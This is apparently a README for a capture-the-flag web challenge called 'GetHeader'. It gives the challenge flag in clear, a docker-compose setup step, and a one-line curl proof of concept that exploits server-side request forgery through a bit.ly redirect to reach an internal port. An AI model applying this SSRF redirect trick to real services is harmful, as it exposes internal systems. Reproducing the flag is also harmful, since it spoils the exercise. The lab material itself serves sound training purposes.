# GetHeader

> Difficulty: Medium </br>
> Category: Web </br>
> FLAG: **YASCON{302-Found-39144a096ac080bad03ca1e67d08b1cb}** </br>

## Setup

```bash
0x02 $ docker-compose up -d
```

## Challenge PoC

> SSRF --> Access flag from internal port 8080

```bash
$ curl http://127.0.0.1 -d "url=https://bit.ly/3nIHn3C" # FLAG!!!
```
<!-- v1dhun 12/10/2020 -->